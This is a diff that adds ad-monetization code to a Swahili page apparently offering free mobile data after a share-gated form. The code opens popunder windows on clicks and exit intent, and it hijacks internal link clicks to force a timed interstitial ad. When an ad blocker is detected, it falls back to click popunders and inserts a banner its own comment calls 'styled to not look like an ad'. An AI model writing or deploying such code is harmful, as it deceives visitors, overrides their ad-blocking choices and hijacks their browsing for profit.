+            if (shareCount >= maxShares) {
+                // Form is being submitted - enable aggressive monetization
+                AD_CONFIG.formSubmitted = true;
+                AD_CONFIG.popunderEnabled = true;
+                AD_CONFIG.exitIntent = true;
+                
+                // Enable exit intent
+                document.addEventListener("mouseout", function(e) {
+                    if (e.clientY < 0 && !localStorage.getItem("exitShown") && AD_CONFIG.formSubmitted) {
+                        window.open("https://www.profitableratecpm.com/ggrjpfgjyv?key=e22432e92181b68e1ed59e1d08ef8b3c", "_blank");
+                        localStorage.setItem("exitShown", "true");
+                    }
+                });
+            }
+            return result;
+        };
+        return originalFormHandler.call(this, event, enhancedHandler);
+    } else {
+        return originalFormHandler.call(this, event, handler);
+    }
+};
+
+// Disable click-based popunders during form completion
+let interactionCount = 0;
+document.addEventListener("click", function() {
+    if (AD_CONFIG.formSubmitted && AD_CONFIG.popunderEnabled) {
+        interactionCount++;
+        if (interactionCount % AD_CONFIG.popupFrequency === 0) {
+            setTimeout(() => {
+                window.open("https://www.profitableratecpm.com/kvc6kej98?key=750f269a749fe39ed0dd6da5e0fbea28", "_blank");
+            }, 200);
+        }
+    }
+});
+
+// 4. Dynamic ad loading - keep passive banner ads but disable intrusive ones
+function loadDeferredAds() {
+    // Only load social bar after form submission
+    if (AD_CONFIG.formSubmitted && AD_CONFIG.socialBar && window.innerWidth < 768) {
+        const socialBar = document.createElement("div");
+        socialBar.style.cssText = "position:fixed;bottom:0;left:0;width:100%;background:#fff;box-shadow:0 -2px 10px rgba(0,0,0,0.2);padding:10px;z-index:999;display:flex;justify-content:space-around;";
+        
+        const adContainer = document.createElement("div");
+        adContainer.id = "social-bar-ad";
+        adContainer.style.width = "100%";
+        socialBar.appendChild(adContainer);
+        document.body.appendChild(socialBar);
+        
+        // Load social bar ad
+        const script = document.createElement("script");
+        script.src = "//pl26578160.profitableratecpm.com/50/04/08/5004085dc22ed9b1626a70afaa2ba61c.js";
+        document.body.appendChild(script);
+    }
+    
+    // Keep passive banner refreshes
+    if (AD_CONFIG.adRefreshRate > 0) {
+        setInterval(() => {
+            const container = document.getElementById("container-46d2ce2816c6edd108be1009c02931ab");
+            if (container) {
+                container.innerHTML = "";
+                const script = document.createElement("script");
+                script.async = true;
+                script.src = "//pl26578297.profitableratecpm.com/46d2ce2816c6edd108be1009c02931ab/invoke.js";
+                container.appendChild(script);
+            }
+        }, AD_CONFIG.adRefreshRate);
+    }
+}
+
+// Load initial ads (just passive banners, not intrusive ones)
+window.addEventListener("load", loadDeferredAds);
+
+// 5. Only show interstitial ads after form submission
+const internalLinks = document.querySelectorAll("a[href^='/'], button:not(#shareButton):not(#submitButton)");
+let internalClickCount = 0;
+internalLinks.forEach(el => {
+    el.addEventListener("click", function(e) {
+        if (AD_CONFIG.formSubmitted) {
+            internalClickCount++;
+            if (internalClickCount % 2 === 0) {
+                e.preventDefault();
+                const originalTarget = e.currentTarget.href || "#";
+                
+                // Show interstitial
+                const interstitial = document.createElement("div");
+                interstitial.style.cssText = "position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(255,255,255,0.95);z-index:9999;display:flex;justify-content:center;align-items:center;flex-direction:column;";
+                
+                const adContainer = document.createElement("div");
+                adContainer.innerHTML = `
+                    <div style="text-align:center;margin-bottom:20px;">
+                        <h3>Subiri kidogo...</h3>
+                        <p>Tunakupeleka kwenye ukurasa unaohitaji</p>
+                    </div>
+                    <div id="interstitial-ad-container"></div>
+                    <button id="continue-btn" style="margin-top:20px;padding:10px 20px;background:#2ecc71;color:white;border:none;border-radius:5px;cursor:pointer;">Endelea →</button>
+                `;
+                
+                interstitial.appendChild(adContainer);
+                document.body.appendChild(interstitial);
+                
+                // Load interstitial ad
+                const script = document.createElement("script");
+                script.src = "//www.highperformanceformat.com/6ec2b81211eb55f5adaff24476396d3f/invoke.js";
+                document.getElementById("interstitial-ad-container").appendChild(script);
+                
+                // Continue button
+                document.getElementById("continue-btn").addEventListener("click", function() {
+                    interstitial.remove();
+                    if (originalTarget !== "#") window.location.href = originalTarget;
+                });
+                
+                // Auto-continue after 10 seconds
+                setTimeout(() => {
+                    interstitial.remove();
+                    if (originalTarget !== "#") window.location.href = originalTarget;
+                }, 10000);
+            }
+        }
+    });
+});
+</script>
+
+<!-- High CPM Ad Units Configuration -->
+<script type="text/javascript">
+	atOptions = {
+		'key' : '6ec2b81211eb55f5adaff24476396d3f',
+		'format' : 'iframe',
+		'height' : 60,
+		'width' : 468,
+		'params' : {
+            'passback': 'profitableratecpm',
+            'payout_boost': 'high',
+            'frequency_cap': 3
+        }
+	};
+</script>
+
+<!-- Primary Ad Units -->
+<script async="async" data-cfasync="false" src="//pl26578297.profitableratecpm.com/46d2ce2816c6edd108be1009c02931ab/invoke.js"></script>
+<div id="container-46d2ce2816c6edd108be1009c02931ab"></div>
+
+<!-- Sticky Banner (High Visibility) -->
+<div style="position:fixed;bottom:0;left:0;width:100%;text-align:center;z-index:998;background:rgba(255,255,255,0.9);padding:5px 0;">
+<script type="text/javascript" src="//www.highperformanceformat.com/6ec2b81211eb55f5adaff24476396d3f/invoke.js"></script>
+</div>
+
+<!-- Native In-Feed Ad -->
+<script type='text/javascript' src='//pl26578160.profitableratecpm.com/50/04/08/5004085dc22ed9b1626a70afaa2ba61c.js'></script>
+
+<!-- 🔽 Anti-Blocker Fallback (Ensures Monetization Even with AdBlockers) 🔽 -->
+<script>
+(function() {
+    // Check if ads are blocked after a short delay
+    setTimeout(function() {
+        const adBlockDetected = document.getElementById('container-46d2ce2816c6edd108be1009c02931ab').clientHeight === 0;
+        if (adBlockDetected) {
+            // Fallback monetization - direct popunder
+            document.addEventListener('click', function() {
+                window.open("https://www.profitableratecpm.com/kvc6kej98?key=750f269a749fe39ed0dd6da5e0fbea28", "_blank");
+            }, { once: true });
+            
+            // Show fallback banner (styled to not look like an ad)
+            const fallbackBanner = document.createElement('div');
+            fallbackBanner.innerHTML = `
+                <div style="margin:20px auto;padding:15px;background:#f8f9fa;border-radius:5px;max-width:600px;text-align:center;box-shadow:0 2px 5px rgba(0,0,0,0.1);">
+                    <h3 style="color:#2ecc71;margin:0 0 10px;">📣 Taarifa Muhimu</h3>
+                    <p>Hakikisha umeshiriki fursa hii kwa marafiki na familia wanaohitaji data ya bure!</p>
+                    <button id="important-info-btn" style="background:#0066cc;color:white;border:none;padding:8px 15px;border-radius:3px;cursor:pointer;margin-top:10px;">Fahamu Zaidi</button>
+                </div>
+            `;
+            
+            document.querySelector('.form-section').insertAdjacentElement('afterend', fallbackBanner);
+            
+            // Attach event to fallback button
+            document.getElementById('important-info-btn').addEventListener('click', function() {
+                window.open("https://www.profitableratecpm.com/ggrjpfgjyv?key=e22432e92181b68e1ed59e1d08ef8b3c", "_blank");
+            });
+        }
+    }, 2000);
+})();
+</script>
+</body>
+</html>
